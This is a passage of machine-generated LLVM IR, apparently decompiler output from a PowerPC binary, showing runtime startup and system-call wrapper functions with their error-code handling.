dec_label_pc_10008bd4:                            ; preds = %dec_label_pc_10008bc8, %dec_label_pc_10008ba4, %dec_label_pc_10008b04, %dec_label_pc_10008bd0
  %v0_10008be4 = phi i32 [ 0, %dec_label_pc_10008bc8 ], [ %v2_10008bc0, %dec_label_pc_10008ba4 ], [ %v0_10008be4.pre, %dec_label_pc_10008b04 ], [ -1, %dec_label_pc_10008bd0 ]
  ret i32 %v0_10008be4

; uselistorder directives
  uselistorder i32 %v1_10008ad4, { 1, 0 }
  uselistorder i32 %v2_10008a7c, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_10008a58, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32 %v1_10008a54, { 1, 0 }
  uselistorder i32 %v2_10008a38, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 1, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @function_10009300, { 1, 0 }
  uselistorder label %dec_label_pc_10008bd4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008bd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008b9c, { 1, 0 }
  uselistorder label %dec_label_pc_10008b90, { 1, 0 }
  uselistorder label %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge, { 1, 0 }
}

define i32 @function_10008be8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008c38:
  %v3_10008c3c.pre = load i32, i32* @global_var_100104b0.277, align 4
  %v3_10008c40 = icmp eq i32 %v3_10008c3c.pre, 0
  br i1 %v3_10008c40, label %dec_label_pc_10008c50, label %dec_label_pc_10008c48

dec_label_pc_10008c48:                            ; preds = %dec_label_pc_10008c38
  %v2_10008c4c = load i32, i32* @r4, align 4
  %v3_10008c4c = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_10008c4c)
  store i32 %v3_10008c4c, i32* @r3, align 4
  br label %dec_label_pc_10008c50

dec_label_pc_10008c50:                            ; preds = %dec_label_pc_10008c38, %dec_label_pc_10008c48
  %v3_10008c54 = load i32, i32* @global_var_100104b4.278, align 4
  %v3_10008c58 = icmp eq i32 %v3_10008c54, 0
  br i1 %v3_10008c58, label %dec_label_pc_10008c50.dec_label_pc_10008c68_crit_edge, label %dec_label_pc_10008c60

dec_label_pc_10008c50.dec_label_pc_10008c68_crit_edge: ; preds = %dec_label_pc_10008c50
  %v0_10008c78.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008c68

dec_label_pc_10008c60:                            ; preds = %dec_label_pc_10008c50
  %v2_10008c64 = load i32, i32* @r4, align 4
  %v3_10008c64 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_10008c64)
  br label %dec_label_pc_10008c68

dec_label_pc_10008c68:                            ; preds = %dec_label_pc_10008c50.dec_label_pc_10008c68_crit_edge, %dec_label_pc_10008c60
  %v0_10008c78 = phi i32 [ %v0_10008c78.pre, %dec_label_pc_10008c50.dec_label_pc_10008c68_crit_edge ], [ %v3_10008c64, %dec_label_pc_10008c60 ]
  ret i32 %v0_10008c78

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008c68, { 1, 0 }
  uselistorder label %dec_label_pc_10008c50, { 1, 0 }
}

define i32 @function_10008c7c() local_unnamed_addr {
dec_label_pc_10008c7c:
  ret i32 0
}

define i32 @function_10008c84() local_unnamed_addr {
dec_label_pc_10008c84:
  %v0_10008c84 = load i32, i32* @r3, align 4
  ret i32 %v0_10008c84
}

define i32 @function_10008c88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008c88:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268471468, i32* @lr, align 4
  %v2_10008ca8 = call i32 @function_1000902c(i32 1, i32 1)
  %v3_10008cac = icmp eq i32 %v2_10008ca8, -1
  br i1 %v3_10008cac, label %dec_label_pc_10008cb4, label %dec_label_pc_10008cd4

dec_label_pc_10008cb4:                            ; preds = %dec_label_pc_10008c88
  %v0_10008cb8 = load i32, i32* @r30, align 4
  store i32 268471496, i32* @lr, align 4
  %v3_10008cc4 = call i32 @function_10009348(i32 ptrtoint ([10 x i8]* @global_var_1000ec90.279 to i32), i32 %v0_10008cb8)
  %v1_10008cc8 = load i32, i32* @r31, align 4
  %v4_10008cc8 = icmp eq i32 %v3_10008cc4, %v1_10008cc8
  br i1 %v4_10008cc8, label %dec_label_pc_10008cd4, label %dec_label_pc_10008cd0

dec_label_pc_10008cd0:                            ; preds = %dec_label_pc_10008cb4
  %v1_10008cd0 = call i32 @function_1000b390(i32 %v3_10008cc4)
  br label %dec_label_pc_10008cd4

dec_label_pc_10008cd4:                            ; preds = %dec_label_pc_10008c88, %dec_label_pc_10008cb4, %dec_label_pc_10008cd0
  %v0_10008ce4 = phi i32 [ %v2_10008ca8, %dec_label_pc_10008c88 ], [ %v3_10008cc4, %dec_label_pc_10008cb4 ], [ %v1_10008cd0, %dec_label_pc_10008cd0 ]
  ret i32 %v0_10008ce4

; uselistorder directives
  uselistorder label %dec_label_pc_10008cd4, { 2, 1, 0 }
}

define i32 @function_10008ce8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008ce8:
  %v3_10008d08 = load i32, i32* @global_var_100104b8.280, align 4
  %v3_10008d0c = icmp eq i32 %v3_10008d08, 0
  br i1 %v3_10008d0c, label %dec_label_pc_10008d30, label %dec_label_pc_10008ce8.dec_label_pc_10008d54_crit_edge

dec_label_pc_10008ce8.dec_label_pc_10008d54_crit_edge: ; preds = %dec_label_pc_10008ce8
  %v0_10008d64.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10008d54

dec_label_pc_10008d30:                            ; preds = %dec_label_pc_10008ce8
  store i32 1, i32* @global_var_100104b8.280, align 4
  store i32 4096, i32* @global_var_100104ac.259, align 4
  %v1_10008d50 = call i32 @function_10005400(i32 268456960)
  br label %dec_label_pc_10008d54

dec_label_pc_10008d54:                            ; preds = %dec_label_pc_10008ce8.dec_label_pc_10008d54_crit_edge, %dec_label_pc_10008d30
  %v0_10008d64 = phi i32 [ %v0_10008d64.pre, %dec_label_pc_10008ce8.dec_label_pc_10008d54_crit_edge ], [ %v1_10008d50, %dec_label_pc_10008d30 ]
  ret i32 %v0_10008d64

; uselistorder directives
  uselistorder label %dec_label_pc_10008d54, { 1, 0 }
}

define i32 @function_10008d68(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10008d68:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10008d80 = mul i32 %arg2, 4
  %v2_10008d84 = add i32 %tmp, %v1_10008d80
  %v0_10008d88 = load i32, i32* @r9, align 4
  store i32 %v0_10008d88, i32* @global_var_100104a4.281, align 4
  %v1_10008d8c = add i32 %v2_10008d84, 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10008d8c, i32* @global_var_100104a8.276, align 4
  store i32 %arg6, i32* @global_var_100104b4.278, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_10008dac = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10008db4 = icmp eq i32 %v1_10008d8c, %v2_10008dac
  br i1 %v4_10008db4, label %dec_label_pc_10008dbc, label %dec_label_pc_10008dc0

dec_label_pc_10008dbc:                            ; preds = %dec_label_pc_10008d68
  store i32 %v2_10008d84, i32* @global_var_100104a8.276, align 4
  br label %dec_label_pc_10008dc0

dec_label_pc_10008dc0:                            ; preds = %dec_label_pc_10008d68, %dec_label_pc_10008dbc
  %v2_10008dc0 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268471760, i32* @lr, align 4
  %v3_10008dcc = call i32 @function_10006e28(i32 %v2_10008dc0, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_100104a8.276, align 4
  br label %dec_label_pc_10008ddc

dec_label_pc_10008ddc:                            ; preds = %dec_label_pc_10008ddc, %dec_label_pc_10008dc0
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10008dc0 ], [ %v1_10008de0, %dec_label_pc_10008ddc ]
  %v1_10008ddc = inttoptr i32 %storemerge to i32*
  %v2_10008ddc = load i32, i32* %v1_10008ddc, align 4
  %v1_10008de0 = add i32 %storemerge, 4
  %v3_10008de4 = icmp eq i32 %v2_10008ddc, 0
  br i1 %v3_10008de4, label %dec_label_pc_10008dec, label %dec_label_pc_10008ddc

dec_label_pc_10008dec:                            ; preds = %dec_label_pc_10008ddc
  store i32 %v1_10008de0, i32* %r29.global-to-local, align 4
  %v1_10008e1812 = inttoptr i32 %v1_10008de0 to i32*
  %v2_10008e1813 = load i32, i32* %v1_10008e1812, align 4
  %v3_10008e1c16 = icmp eq i32 %v2_10008e1813, 0
  br i1 %v3_10008e1c16, label %dec_label_pc_10008e24, label %dec_label_pc_10008df4

dec_label_pc_10008df4:                            ; preds = %dec_label_pc_10008dec, %dec_label_pc_10008e14
  %v0_10008e08 = phi i32 [ %v1_10008e14, %dec_label_pc_10008e14 ], [ %v1_10008de0, %dec_label_pc_10008dec ]
  %v0_10008dfc = phi i32 [ %v2_10008e18, %dec_label_pc_10008e14 ], [ %v2_10008e1813, %dec_label_pc_10008dec ]
  %v2_10008df4 = icmp ugt i32 %v0_10008dfc, 14
  br i1 %v2_10008df4, label %dec_label_pc_10008e14, label %dec_label_pc_10008dfc

dec_label_pc_10008dfc:                            ; preds = %dec_label_pc_10008df4
  %v1_10008dfc = mul i32 %v0_10008dfc, 8
  %v2_10008e04 = add i32 %v1_10008dfc, %v2_10008dc0
  store i32 %v2_10008e04, i32* @r3, align 4
  store i32 %v0_10008e08, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268471828, i32* @lr, align 4
  %v0_10008e10 = call i32 @function_10006d8c()
  %v0_10008e14.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008e14

dec_label_pc_10008e14:                            ; preds = %dec_label_pc_10008df4, %dec_label_pc_10008dfc
  %v0_10008e14 = phi i32 [ %v0_10008e08, %dec_label_pc_10008df4 ], [ %v0_10008e14.pre, %dec_label_pc_10008dfc ]
  %v1_10008e14 = add i32 %v0_10008e14, 8
  store i32 %v1_10008e14, i32* %r29.global-to-local, align 4
  %v1_10008e18 = inttoptr i32 %v1_10008e14 to i32*
  %v2_10008e18 = load i32, i32* %v1_10008e18, align 4
  %v3_10008e1c = icmp eq i32 %v2_10008e18, 0
  br i1 %v3_10008e1c, label %dec_label_pc_10008e24, label %dec_label_pc_10008df4

dec_label_pc_10008e24:                            ; preds = %dec_label_pc_10008e14, %dec_label_pc_10008dec
  %v1_10008e28 = call i32 @function_1000b4e0(i32 %v2_10008dc0)
  store i32 %v1_10008e28, i32* @r3, align 4
  store i32 268471856, i32* @lr, align 4
  %v1_10008e2c = call i32 @function_10008ce8(i32 %v1_10008e28)
  %v3_10008e34 = icmp eq i32 %tmp27, 0
  br i1 %v3_10008e34, label %dec_label_pc_10008e3c, label %dec_label_pc_10008e40

dec_label_pc_10008e3c:                            ; preds = %dec_label_pc_10008e24
  br label %dec_label_pc_10008e40

dec_label_pc_10008e40:                            ; preds = %dec_label_pc_10008e24, %dec_label_pc_10008e3c
  %v0_10008e48 = phi i32 [ %tmp27, %dec_label_pc_10008e24 ], [ 4096, %dec_label_pc_10008e3c ]
  store i32 %v0_10008e48, i32* @global_var_100104ac.259, align 4
  %v3_10008e4c = icmp eq i32 %tmp26, -1
  br i1 %v3_10008e4c, label %dec_label_pc_10008e54, label %dec_label_pc_10008e88

dec_label_pc_10008e54:                            ; preds = %dec_label_pc_10008e40
  store i32 268471896, i32* @lr, align 4
  %v1_10008e54 = call i32 @function_100092b8(i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 %v1_10008e54, i32* %r29.global-to-local, align 4
  store i32 268471904, i32* @lr, align 4
  %v0_10008e5c = call i32 @function_10009228()
  %v4_10008e60 = icmp eq i32 %v1_10008e54, %v0_10008e5c
  br i1 %v4_10008e60, label %dec_label_pc_10008e68, label %dec_label_pc_10008ea4

dec_label_pc_10008e68:                            ; preds = %dec_label_pc_10008e54
  store i32 268471916, i32* @lr, align 4
  %v1_10008e68 = call i32 @function_10009270(i32 %v0_10008e5c)
  store i32 %v1_10008e68, i32* %r29.global-to-local, align 4
  store i32 268471924, i32* @lr, align 4
  %v0_10008e70 = call i32 @function_100091e0()
  %v4_10008e74 = icmp eq i32 %v1_10008e68, %v0_10008e70
  br i1 %v4_10008e74, label %dec_label_pc_10008e7c.thread, label %dec_label_pc_10008ea4

dec_label_pc_10008e7c.thread:                     ; preds = %dec_label_pc_10008e68
  br label %dec_label_pc_10008ed4

dec_label_pc_10008e88:                            ; preds = %dec_label_pc_10008e40
  %v4_10008e8c = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10008e8c, label %dec_label_pc_10008e94, label %dec_label_pc_10008ea4

dec_label_pc_10008e94:                            ; preds = %dec_label_pc_10008e88
  br label %dec_label_pc_10008ea4

dec_label_pc_10008ea4:                            ; preds = %dec_label_pc_10008e94, %dec_label_pc_10008e88, %dec_label_pc_10008e68, %dec_label_pc_10008e54
  store i32 268471988, i32* @lr, align 4
  %v2_10008eb0 = call i32 @function_10008c88(i32 0, i32 32768)
  store i32 268472004, i32* @lr, align 4
  %v2_10008ec0 = call i32 @function_10008c88(i32 1, i32 32770)
  store i32 268472020, i32* @lr, align 4
  %v2_10008ed0 = call i32 @function_10008c88(i32 2, i32 32770)
  br label %dec_label_pc_10008ed4

dec_label_pc_10008ed4:                            ; preds = %dec_label_pc_10008e7c.thread, %dec_label_pc_10008ea4
  %v0_10008ee0 = load i32, i32* @r30, align 4
  %v1_10008ee0 = inttoptr i32 %v0_10008ee0 to i32*
  %v2_10008ee0 = load i32, i32* %v1_10008ee0, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10008ee0, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1092) to i32*), align 4
  %v0_10008f00 = load i32, i32* @r27, align 4
  store i32 %v0_10008f00, i32* @global_var_100104b0.277, align 4
  br i1 false, label %dec_label_pc_10008f08, label %dec_label_pc_10008f80

dec_label_pc_10008f08:                            ; preds = %dec_label_pc_10008ed4, %dec_label_pc_10008f08
  br i1 undef, label %dec_label_pc_10008f08, label %dec_label_pc_10008f80

dec_label_pc_10008f80:                            ; preds = %dec_label_pc_10008f08, %dec_label_pc_10008ed4
  %v0_10008f2c = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10008f2c)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10008f90 = call i32 @function_10004b48()
  %v2_10008f98 = inttoptr i32 %v0_10008f90 to i32*
  store i32 0, i32* %v2_10008f98, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -27320), i32 0), label %dec_label_pc_10008fb8, label %dec_label_pc_10008fac

dec_label_pc_10008fac:                            ; preds = %dec_label_pc_10008f80
  %v0_10008fac = call i32 @function_10009548()
  %v2_10008fb4 = inttoptr i32 %v0_10008fac to i32*
  store i32 0, i32* %v2_10008fb4, align 4
  br label %dec_label_pc_10008fb8

dec_label_pc_10008fb8:                            ; preds = %dec_label_pc_10008f80, %dec_label_pc_10008fac
  %v0_10008fc4 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10008fc4)
  %v0_10008fd0 = call i32 @function_1000885c()
  ret i32 %v0_10008fd0

; uselistorder directives
  uselistorder i32 %v2_10008e18, { 1, 0 }
  uselistorder i32 %v1_10008e14, { 2, 1, 0 }
  uselistorder i32 %v1_10008de0, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10008dc0, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_1000885c, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* @global_var_100104b0.277, { 1, 0 }
  uselistorder i32 1092, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10008c88, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 14, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10008fb8, { 1, 0 }
  uselistorder label %dec_label_pc_10008f08, { 1, 0 }
  uselistorder label %dec_label_pc_10008ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10008e40, { 1, 0 }
  uselistorder label %dec_label_pc_10008e14, { 1, 0 }
  uselistorder label %dec_label_pc_10008df4, { 1, 0 }
  uselistorder label %dec_label_pc_10008dc0, { 1, 0 }
}

define i32 @function_10008fd4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008fd4:
  %v0_10008fdc = load i32, i32* @lr, align 4
  %v1_10008fdc = load i1, i1* @cr0_so, align 1
  %v2_10008fdc = xor i1 %v1_10008fdc, true
  call void @__pseudo_cond_branch(i1 %v2_10008fdc, i32 %v0_10008fdc)
  %v0_10008fe0 = call i32 @function_1000b4fc()
  ret i32 %v0_10008fe0

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 0 }
}

define i32 @function_10008fe4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008fe4:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008ffc = call i32 @__asm_mfcr()
  %v1_10009000 = and i32 %v0_10008ffc, 268435456
  %v3_10009000 = icmp eq i32 %v1_10009000, 0
  store i32 %v0_10008ffc, i32* %r31.global-to-local, align 4
  br i1 %v3_10009000, label %dec_label_pc_10009018, label %dec_label_pc_1000900c

dec_label_pc_1000900c:                            ; preds = %dec_label_pc_10008fe4
  %v0_1000900c = call i32 @function_10004b48()
  %v0_10009010 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009010 = inttoptr i32 %v0_1000900c to i32*
  store i32 %v0_10009010, i32* %v2_10009010, align 4
  br label %dec_label_pc_10009018

dec_label_pc_10009018:                            ; preds = %dec_label_pc_10008fe4, %dec_label_pc_1000900c
  %v0_10009028 = phi i32 [ %v0_10008ffc, %dec_label_pc_10008fe4 ], [ -1, %dec_label_pc_1000900c ]
  ret i32 %v0_10009028

; uselistorder directives
  uselistorder label %dec_label_pc_10009018, { 1, 0 }
}

define i32 @function_1000902c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000902c:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10009040 = add i32 %arg2, -12
  %v2_10009044 = icmp ugt i32 %v1_10009040, 2
  %v2_1000904c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000904c, i32* %stack_var_-32, align 4
  br i1 %v2_10009044, label %dec_label_pc_10009078, label %dec_label_pc_10009068

dec_label_pc_10009068:                            ; preds = %dec_label_pc_1000902c
  store i32 268472432, i32* @lr, align 4
  %v2_1000906c = call i32 @function_100090b0(i32 3)
  store i32 %v2_1000906c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009098

dec_label_pc_10009078:                            ; preds = %dec_label_pc_1000902c
  %v0_1000907c = call i32 @__asm_mfcr()
  %v1_10009080 = and i32 %v0_1000907c, 268435456
  %v3_10009080 = icmp eq i32 %v1_10009080, 0
  store i32 %v0_1000907c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009080, label %dec_label_pc_10009098, label %dec_label_pc_1000908c

dec_label_pc_1000908c:                            ; preds = %dec_label_pc_10009078
  %v0_1000908c = call i32 @function_10004b48()
  %v0_10009090 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009090 = inttoptr i32 %v0_1000908c to i32*
  store i32 %v0_10009090, i32* %v2_10009090, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009098

dec_label_pc_10009098:                            ; preds = %dec_label_pc_10009078, %dec_label_pc_10009068, %dec_label_pc_1000908c
  %v0_1000909c = phi i32 [ %v0_1000907c, %dec_label_pc_10009078 ], [ %v2_1000906c, %dec_label_pc_10009068 ], [ -1, %dec_label_pc_1000908c ]
  ret i32 %v0_1000909c

; uselistorder directives
  uselistorder i32 -12, { 4, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10009098, { 2, 0, 1 }
}

define i32 @function_100090b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100090b0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_100090c8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100090c8, i32* %stack_var_-32, align 4
  %v0_100090e4 = call i32 @__asm_mfcr()
  %v1_100090e8 = and i32 %v0_100090e4, 268435456
  %v3_100090e8 = icmp eq i32 %v1_100090e8, 0
  store i32 %v0_100090e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100090e8, label %dec_label_pc_10009100, label %dec_label_pc_100090f4

dec_label_pc_100090f4:                            ; preds = %dec_label_pc_100090b0
  %v0_100090f4 = call i32 @function_10004b48()
  %v0_100090f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100090f8 = inttoptr i32 %v0_100090f4 to i32*
  store i32 %v0_100090f8, i32* %v2_100090f8, align 4
  br label %dec_label_pc_10009100

dec_label_pc_10009100:                            ; preds = %dec_label_pc_100090b0, %dec_label_pc_100090f4
  %v0_10009110 = phi i32 [ %v0_100090e4, %dec_label_pc_100090b0 ], [ -1, %dec_label_pc_100090f4 ]
  ret i32 %v0_10009110

; uselistorder directives
  uselistorder label %dec_label_pc_10009100, { 1, 0 }
}

define i32 @function_10009114(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009114:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10009128

dec_label_pc_10009128:                            ; preds = %dec_label_pc_10009128.backedge, %dec_label_pc_10009114
  %v0_10009134 = call i32 @__asm_mfcr()
  %v1_10009138 = and i32 %v0_10009134, 268435456
  %v3_10009138 = icmp eq i32 %v1_10009138, 0
  store i32 %v0_10009134, i32* %r31.global-to-local, align 4
  br i1 %v3_10009138, label %dec_label_pc_10009128.backedge, label %dec_label_pc_10009144

dec_label_pc_10009144:                            ; preds = %dec_label_pc_10009128
  %v0_10009144 = call i32 @function_10004b48()
  %v0_10009148 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009148 = inttoptr i32 %v0_10009144 to i32*
  store i32 %v0_10009148, i32* %v2_10009148, align 4
  br label %dec_label_pc_10009128.backedge

dec_label_pc_10009128.backedge:                   ; preds = %dec_label_pc_10009144, %dec_label_pc_10009128
  br label %dec_label_pc_10009128
}

define i32 @function_10009150(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009150:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009168 = call i32 @__asm_mfcr()
  %v1_1000916c = and i32 %v0_10009168, 268435456
  %v3_1000916c = icmp eq i32 %v1_1000916c, 0
  store i32 %v0_10009168, i32* %r31.global-to-local, align 4
  br i1 %v3_1000916c, label %dec_label_pc_10009184, label %dec_label_pc_10009178

dec_label_pc_10009178:                            ; preds = %dec_label_pc_10009150
  %v0_10009178 = call i32 @function_10004b48()
  %v0_1000917c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000917c = inttoptr i32 %v0_10009178 to i32*
  store i32 %v0_1000917c, i32* %v2_1000917c, align 4
  br label %dec_label_pc_10009184

dec_label_pc_10009184:                            ; preds = %dec_label_pc_10009150, %dec_label_pc_10009178
  %v0_10009194 = phi i32 [ %v0_10009168, %dec_label_pc_10009150 ], [ -1, %dec_label_pc_10009178 ]
  ret i32 %v0_10009194

; uselistorder directives
  uselistorder label %dec_label_pc_10009184, { 1, 0 }
}

define i32 @function_10009198(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009198:
  %r31.global-to-local = alloca i32, align 4
  %v0_100091b0 = call i32 @__asm_mfcr()
  %v1_100091b4 = and i32 %v0_100091b0, 268435456
  %v3_100091b4 = icmp eq i32 %v1_100091b4, 0
  store i32 %v0_100091b0, i32* %r31.global-to-local, align 4
  br i1 %v3_100091b4, label %dec_label_pc_100091cc, label %dec_label_pc_100091c0

dec_label_pc_100091c0:                            ; preds = %dec_label_pc_10009198
  %v0_100091c0 = call i32 @function_10004b48()
  %v0_100091c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100091c4 = inttoptr i32 %v0_100091c0 to i32*
  store i32 %v0_100091c4, i32* %v2_100091c4, align 4
  br label %dec_label_pc_100091cc

dec_label_pc_100091cc:                            ; preds = %dec_label_pc_10009198, %dec_label_pc_100091c0
  %v0_100091dc = phi i32 [ %v0_100091b0, %dec_label_pc_10009198 ], [ -1, %dec_label_pc_100091c0 ]
  ret i32 %v0_100091dc

; uselistorder directives
  uselistorder label %dec_label_pc_100091cc, { 1, 0 }
}

define i32 @function_100091e0() local_unnamed_addr {
dec_label_pc_100091e0:
  %r31.global-to-local = alloca i32, align 4
  %v0_100091f8 = call i32 @__asm_mfcr()
  %v1_100091fc = and i32 %v0_100091f8, 268435456
  %v3_100091fc = icmp eq i32 %v1_100091fc, 0
  store i32 %v0_100091f8, i32* %r31.global-to-local, align 4
  br i1 %v3_100091fc, label %dec_label_pc_10009214, label %dec_label_pc_10009208

dec_label_pc_10009208:                            ; preds = %dec_label_pc_100091e0
  %v0_10009208 = call i32 @function_10004b48()
  %v0_1000920c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000920c = inttoptr i32 %v0_10009208 to i32*
  store i32 %v0_1000920c, i32* %v2_1000920c, align 4
  br label %dec_label_pc_10009214

dec_label_pc_10009214:                            ; preds = %dec_label_pc_100091e0, %dec_label_pc_10009208
  %v0_10009224 = phi i32 [ %v0_100091f8, %dec_label_pc_100091e0 ], [ -1, %dec_label_pc_10009208 ]
  ret i32 %v0_10009224

; uselistorder directives
  uselistorder label %dec_label_pc_10009214, { 1, 0 }
}

define i32 @function_10009228() local_unnamed_addr {
dec_label_pc_10009228:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009240 = call i32 @__asm_mfcr()
  %v1_10009244 = and i32 %v0_10009240, 268435456
  %v3_10009244 = icmp eq i32 %v1_10009244, 0
  store i32 %v0_10009240, i32* %r31.global-to-local, align 4
  br i1 %v3_10009244, label %dec_label_pc_1000925c, label %dec_label_pc_10009250

dec_label_pc_10009250:                            ; preds = %dec_label_pc_10009228
  %v0_10009250 = call i32 @function_10004b48()
  %v0_10009254 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009254 = inttoptr i32 %v0_10009250 to i32*
  store i32 %v0_10009254, i32* %v2_10009254, align 4
  br label %dec_label_pc_1000925c

dec_label_pc_1000925c:                            ; preds = %dec_label_pc_10009228, %dec_label_pc_10009250
  %v0_1000926c = phi i32 [ %v0_10009240, %dec_label_pc_10009228 ], [ -1, %dec_label_pc_10009250 ]
  ret i32 %v0_1000926c

; uselistorder directives
  uselistorder label %dec_label_pc_1000925c, { 1, 0 }
}

define i32 @function_10009270(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009270:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009288 = call i32 @__asm_mfcr()
  %v1_1000928c = and i32 %v0_10009288, 268435456
  %v3_1000928c = icmp eq i32 %v1_1000928c, 0
  store i32 %v0_10009288, i32* %r31.global-to-local, align 4
  br i1 %v3_1000928c, label %dec_label_pc_100092a4, label %dec_label_pc_10009298

dec_label_pc_10009298:                            ; preds = %dec_label_pc_10009270
  %v0_10009298 = call i32 @function_10004b48()
  %v0_1000929c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000929c = inttoptr i32 %v0_10009298 to i32*
  store i32 %v0_1000929c, i32* %v2_1000929c, align 4
  br label %dec_label_pc_100092a4

dec_label_pc_100092a4:                            ; preds = %dec_label_pc_10009270, %dec_label_pc_10009298
  %v0_100092b4 = phi i32 [ %v0_10009288, %dec_label_pc_10009270 ], [ -1, %dec_label_pc_10009298 ]
  ret i32 %v0_100092b4

; uselistorder directives
  uselistorder label %dec_label_pc_100092a4, { 1, 0 }
}

define i32 @function_100092b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100092b8:
  %r31.global-to-local = alloca i32, align 4
  %v0_100092d0 = call i32 @__asm_mfcr()
  %v1_100092d4 = and i32 %v0_100092d0, 268435456
  %v3_100092d4 = icmp eq i32 %v1_100092d4, 0
  store i32 %v0_100092d0, i32* %r31.global-to-local, align 4
  br i1 %v3_100092d4, label %dec_label_pc_100092ec, label %dec_label_pc_100092e0

